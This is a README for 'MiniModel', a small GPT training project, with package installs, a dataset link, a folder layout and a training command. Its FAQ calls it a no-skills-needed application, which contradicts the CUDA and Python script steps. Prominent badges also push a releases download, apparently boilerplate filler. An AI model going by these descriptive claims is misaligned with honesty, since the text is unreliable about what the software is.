# 🛠️ MiniModel - Simple Setup for Your Training Needs

[![Download MiniModel](https://img.shields.io/badge/Download-MiniModel-blue.svg)](https://github.com/LucasTomio/MiniModel/releases)

## 🚀 Getting Started

MiniModel helps you get your training tasks up and running quickly. This guide simplifies the process for all users, even those with no technical background.

## 💻 System Requirements

- Operating System: Windows, macOS, or Linux
- Python: Version 3.7 or higher
- Internet connection for downloading packages and data

## 📥 Download & Install

To get MiniModel, visit this page to download: [MiniModel Releases](https://github.com/LucasTomio/MiniModel/releases).

Follow the steps below to successfully set up and run the software.

## 🛠️ Setup & Training

### 1. Install Dependencies  
First, install the required packages:

```bash
pip install torchao liger_kernel pyarrow tensorboard
```

> 💡 **Note**: `torchao` and `liger_kernel` may require a recent version of PyTorch (≥2.3) and a CUDA-enabled environment for optimal performance.

### 2. Prepare Data  
1. Download all files from this repository.  
2. Place them in a single working directory.  
3. Inside this directory, create a subfolder named `128`.  
4. Download the training data (Parquet files) into the `128/` folder:  
   🔗 **[TinyCorpus-v2](https://huggingface.co/datasets/xTimeCrystal/TinyCorpus-v2)**

### 3. File Structure  
Your directory should look like this:

```
your-training-folder/
├── trainGPT-token.py
├── fast_self_attn_model.py
├── data_utils.py
├── dev_optim.py
└── 128/
    ├── tinycorpus-000-of-128.parquet
    ├── tinycorpus-001-of-128.parquet
    └── ...                            # all shard files
```

### 4. Start Training  
Run the training script from inside your working directory with the following command:

```bash
python trainGPT-token.py
```

## ⚙️ Frequently Asked Questions

### What is MiniModel?

MiniModel is a user-friendly application designed to simplify the training process for models. It helps you efficiently manage your training data and scripts.

### Do I need programming skills?

No. This guide is designed for users with no programming knowledge. Simply follow the steps outlined to set up and run the software.

### Where can I find help?

If you encounter issues, check the [issues section](https://github.com/LucasTomio/MiniModel/issues) in the GitHub repository. You can also ask questions there.

## 🚀 Additional Resources

- Documentation: Explore further details and examples in the repository documentation.
- Community: Join the discussions and get feedback from other users on the issues page.

[![Download MiniModel](https://img.shields.io/badge/Download-MiniModel-blue.svg)](https://github.com/LucasTomio/MiniModel/releases) 

Following this guide will ensure you have MiniModel up and running with ease. If you encounter any issues, don't hesitate to seek assistance!